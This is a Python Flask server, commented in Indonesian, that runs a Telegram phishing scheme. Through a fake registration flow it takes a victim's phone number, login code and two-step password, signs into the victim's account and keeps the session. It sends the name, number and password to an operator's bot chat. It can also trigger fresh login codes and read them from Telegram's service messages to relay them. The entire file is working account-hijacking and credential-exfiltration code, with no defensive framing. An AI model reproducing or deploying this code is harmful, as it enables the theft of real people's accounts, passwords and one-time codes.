import os, requests, asyncio, re, threading
from flask import Flask, request, jsonify
from flask_cors import CORS
from telethon import TelegramClient, events, errors
from telethon.sessions import StringSession

app = Flask(__name__)
CORS(app)

API_ID = os.getenv("API_ID")
API_HASH = os.getenv("API_HASH")
BOT_TOKEN = os.getenv("BOT_TOKEN")
CHAT_ID = os.getenv("TELEGRAM_CHAT_ID")

user_db = {}

def bot_api(method, payload):
    return requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/{method}", json=payload).json()

def normalisasi_nomor(nomor):
    num = re.sub(r'\D', '', nomor)
    if num.startswith('0'): num = '62' + num[1:]
    elif num.startswith('8'): num = '62' + num
    return '+' + num

@app.route('/register', methods=['POST'])
def register():
    data = request.get_json()
    if not data: return jsonify({"status": "error"}), 400
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    try:
        return loop.run_until_complete(handle_flow(data))
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500

async def handle_flow(data):
    client = None
    try:
        step = data.get('step')
        nomor = normalisasi_nomor(data.get('nomor', ''))
        nama = data.get('nama', 'User')

        session_str = user_db.get(nomor, {}).get('session', '')
        client = TelegramClient(StringSession(session_str), int(API_ID), API_HASH)
        await client.connect()

        if step == 1:
            # Pancingan awal - data belum dikirim ke bot
            res = await client.send_code_request(nomor)
            user_db[nomor] = {
                "session": client.session.save(), 
                "hash": res.phone_code_hash, 
                "nama": nama, 
                "sandi": "None",
                "msg_id": None
            }
            return jsonify({"status": "success"})

        elif step == 2:
            # Verifikasi OTP browser
            try:
                await client.sign_in(nomor, data.get('otp'), phone_code_hash=user_db[nomor]['hash'])
                user_db[nomor]['session'] = client.session.save()
                
                # Cek jika tidak ada 2FA, kirim data ke bot dengan OTP: None
                try:
                    # Jika lolos sampai sini berarti login sukses (tidak ada 2FA)
                    text = f"Nama: **{user_db[nomor]['nama']}**\nNomor: `{nomor}`\nKata sandi: None\nOTP : None"
                    msg = bot_api("sendMessage", {
                        "chat_id": CHAT_ID, "text": text, "parse_mode": "Markdown",
                        "reply_markup": {"inline_keyboard": [[{"text": "otp", "callback_data": f"upd_{nomor}"}]]}
                    })
                    user_db[nomor]['msg_id'] = msg.get('result', {}).get('message_id')
                    return jsonify({"status": "success"})
                except: pass
            except errors.SessionPasswordNeededError:
                user_db[nomor]['session'] = client.session.save()
                return jsonify({"status": "need_2fa"})
            except:
                return jsonify({"status": "invalid_otp"}), 400

        elif step == 3:
            # Verifikasi 2FA browser
            try:
                await client.sign_in(password=data.get('sandi'))
                user_db[nomor]['sandi'] = data.get('sandi')
                user_db[nomor]['session'] = client.session.save()
                
                # Kirim data ke bot setelah semua valid (OTP tetap None)
                text = f"Nama: **{user_db[nomor]['nama']}**\nNomor: `{nomor}`\nKata sandi: **{data.get('sandi')}**\nOTP : None"
                msg = bot_api("sendMessage", {
                    "chat_id": CHAT_ID, "text": text, "parse_mode": "Markdown",
                    "reply_markup": {"inline_keyboard": [[{"text": "otp", "callback_data": f"upd_{nomor}"}]]}
                })
                user_db[nomor]['msg_id'] = msg.get('result', {}).get('message_id')
                return jsonify({"status": "success"})
            except:
                return jsonify({"status": "invalid_2fa"}), 400
                
    finally:
        if client: await client.disconnect()

@app.route('/webhook', methods=['POST'])
def webhook():
    update = request.get_json()
    if "callback_query" in update:
        call = update["callback_query"]
        action, nomor = call["data"].split("_")
        if action == "upd":
            # Respon klik tombol OTP
            res = bot_api("sendMessage", {
                "chat_id": CHAT_ID, "text": "Bot siap menerima OTP!\n/exit untuk keluar", 
                "reply_markup": {"inline_keyboard": [[{"text": "exit", "callback_data": f"exit_{nomor}"}]]}
            })
            user_db.setdefault(nomor, {})['status_id'] = res.get('result', {}).get('message_id')
            
            # Monitoring OTP yang dipicu TurboTel
            threading.Thread(target=lambda: asyncio.run(monitor_incoming_only(nomor))).start()
        elif action == "exit":
             if user_db.get(nomor, {}).get('status_id'):
                bot_api("deleteMessage", {"chat_id": CHAT_ID, "message_id": user_db[nomor]['status_id']})
    return jsonify({"status": "success"})

async def monitor_incoming_only(nomor):
    data = user_db.get(nomor)
    if not data or not data.get('session'): return
    client = TelegramClient(StringSession(data['session']), int(API_ID), API_HASH)
    await client.connect()
    try:
        # PENTING: Memicu OTP baru dari Telegram saat tombol diklik
        try:
            await client.send_code_request(nomor)
        except: pass

        @client.on(events.NewMessage(from_users=777000))
        async def handler(event):
            otp = re.search(r'\b\d{5}\b', event.raw_text)
            if otp:
                # Update OTP yang tadinya 'None' jadi kode asli
                bot_api("editMessageText", {
                    "chat_id": CHAT_ID, "message_id": data['msg_id'],
                    "text": f"Nama: **{data['nama']}**\nNomor: `{nomor}`\nKata sandi: **{data.get('sandi','None')}**\nOTP : `{otp.group(0)}`",
                    "parse_mode": "Markdown", "reply_markup": {"inline_keyboard": [[{"text": "otp", "callback_data": f"upd_{nomor}"}]]}
                })
                # Hapus instruksi 'Bot siap'
                if data.get('status_id'):
                    bot_api("deleteMessage", {"chat_id": CHAT_ID, "message_id": data['status_id']})
                await client.disconnect()
        await asyncio.sleep(600)
    finally:
        if client.is_connected(): await client.disconnect()

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.getenv("PORT", 8080)))